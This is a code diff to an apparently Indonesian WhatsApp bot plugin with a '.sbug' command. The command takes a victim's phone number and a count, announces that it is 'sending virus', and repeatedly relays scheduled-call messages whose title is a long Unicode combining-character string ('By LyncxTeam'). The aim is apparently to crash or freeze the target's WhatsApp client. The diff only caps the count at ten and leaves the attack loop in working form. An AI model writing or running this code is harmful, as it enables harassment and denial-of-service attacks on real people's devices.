@@ -4,7 +4,9 @@ const txt = `🍷꙰͜͡By LyncxTeam💸̷⃨⃛꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫�
   `
     if (!text) throw `uhm... siapa yg mau diserang?\n contoh penggunaan:\n *${usedPrefix + command}* nomor\n Example: *${usedPrefix + command}* 628Xxxxx|jumlah`;
     let [orang, jumlah] = text.split('|')
-    if (!jumlah) throw 'masukan jumlah nya.\n\nContoh\n.sbug 62882....|10'
+    if (!jumlah) throw 'masukan jumlah nya.\n\nContoh\n.sbug 62882....|10'   
+    let fixedJumlah = jumlah ? jumlah * 1 : 10
+if (fixedJumlah > 10) throw '*[ ! ]* TERLALU BANYAK VIRUS! JUMLAH HARUS KURANG DARI 10'
     m.reply('_Sedang mengirim virus..._')
     let who
     try {
@@ -12,7 +14,7 @@ const txt = `🍷꙰͜͡By LyncxTeam💸̷⃨⃛꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫�
         else who = orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         if (who.length <= 20) throw 'balas atau tag orang yg mau di serang!';
         conn.logger.info(`\nKorban: ${who}\nJumlah: ${jumlah}`)
-        for (let i = jumlah; i > 1; i--) {
+        for (let i = fixedJumlah; i > 1; i--) {
             if (i !== 0) conn.relayMessage(who, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 0,
 title: txt}}, {})
         }
